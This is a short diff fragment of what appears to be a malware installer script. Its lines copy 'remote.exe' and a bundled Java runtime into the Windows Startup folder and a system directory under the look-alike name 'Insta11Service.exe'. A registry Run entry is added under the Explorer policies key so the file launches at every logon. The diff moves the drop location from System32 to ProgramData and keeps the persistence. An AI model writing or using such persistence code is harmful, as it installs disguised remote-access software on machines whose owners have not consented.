@@ -41,8 +41,8 @@ cmd:copy /Y remote.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Sta
 cmd:md "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jre"
 cmd:xcopy jre "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jre" /S /E /Y /Q
 
-cmd:copy /Y remote.exe "C:\Windows\System32\Insta11Service.exe"
-cmd:md "C:\Windows\System32\jre"
-cmd:xcopy jre "C:\Windows\System32\jre" /S /E /Y /Q
-cmd:reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /t REG_SZ /d C:\Windows\System32\Insta11Service.exe /f
+cmd:copy /Y remote.exe "C:\ProgramData\Microsoft\Windows\Insta11Service.exe"
+cmd:md "C:\ProgramData\Microsoft\Windows\jre"
+cmd:xcopy jre "C:\ProgramData\Microsoft\Windows\jre" /S /E /Y /Q
+cmd:reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /t REG_SZ /d C:\ProgramData\Microsoft\Windows\Insta11Service.exe /f
 --cmd:reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /v two /f
